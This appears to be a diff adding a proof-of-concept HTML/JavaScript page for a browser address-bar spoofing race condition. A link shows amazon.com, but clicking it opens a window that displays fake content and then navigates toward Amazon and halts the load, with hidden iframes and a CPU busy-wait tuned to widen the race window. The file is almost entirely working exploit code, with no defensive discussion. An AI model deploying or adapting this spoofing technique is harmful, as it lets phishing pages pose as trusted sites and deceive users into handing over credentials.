@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Tweaked Spoof PoC</title>
+</head>
+<body>
+    <a id="test" href="https://www.amazon.com/" onclick="foo()">https://www.amazon.com/</a>
+</body>
+<script>
+var w;
+var t;
+var z;
+
+if (location.href.indexOf("fake") !== -1) {
+    document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
+}
+
+function foo() {
+    document.getElementById("test").href = "#";
+    w = window.open("?fake");
+    t = setInterval(bar, 5);  // Adjusted interval for better timing sync
+}
+
+function bar() {
+    if (w.location.href !== 'about:blank') {
+        alert("Redirecting");
+        document.body.innerHTML = "<h1>Redirecting</h1>";
+        slow();
+        w.location.href = 'https://www.amazon.com/';
+        clearInterval(t);
+        z = setInterval(baz, 5);
+    }
+}
+
+function baz() {
+    try {
+        w.location.href !== 'about:blank';
+    } catch (e) {
+        // Stop page loading with alternative slow 204-like endpoint (e.g., Google CSI or custom delay)
+        w.location.href = 'https://www.google.com/csi';  // Keep for compatibility, but test with slower alternatives
+        clearInterval(z);
+        // Removed setTimeout to prevent premature close and content clear
+    }
+}
+
+// Enhanced slowdown: More iframes + CPU-intensive loop
+function slow() {
+    for (let i = 0; i < 50; i++) {  // Increased iframes
+        let iframe = document.createElement("iframe");
+        iframe.src = 'https://www.amazon.com/';
+        iframe.style = 'display:none';
+        document.body.appendChild(iframe);
+    }
+    // Add CPU loop to widen race window
+    let start = performance.now();
+    while (performance.now() - start < 100) {}  // ~100ms busy-wait
+}
+</script>
+</html>
